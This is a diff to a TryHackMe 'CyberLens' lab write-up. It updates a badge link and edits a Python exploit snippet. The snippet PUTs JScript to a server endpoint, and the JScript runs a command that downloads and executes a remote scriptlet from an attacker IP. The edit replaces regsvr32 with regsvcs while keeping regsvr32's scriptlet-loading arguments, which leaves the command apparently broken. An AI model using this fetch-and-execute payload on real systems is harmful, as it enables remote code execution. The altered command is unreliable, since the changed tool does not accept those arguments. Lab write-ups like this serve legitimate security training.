@@ -2,7 +2,7 @@
 
 ### TryHackMe Writeup
 
-[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
+[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/cyberlensp6)
 [![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
 [![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
 [![Type](https://img.shields.io/badge/Type-Windows-informational?style=for-the-badge&logo=windows)](https://tryhackme.com)
@@ -68,7 +68,7 @@ headers = {
 
 jscript = '''
 var oShell = WScript.CreateObject("WScript.Shell");
-var oExec = oShell.Exec('cmd /c regsvr32 /s /n /u /i:http://10.14.102.34:8080/payload.sct scrobj.dll');
+var oExec = oShell.Exec('cmd /c regsvcs /s /n /u /i:http://10.14.102.34:8080/payload.sct scrobj.dll');
 '''
 
 requests.put("http://cyberlens.thm:61777/meta", headers=headers, data=jscript)
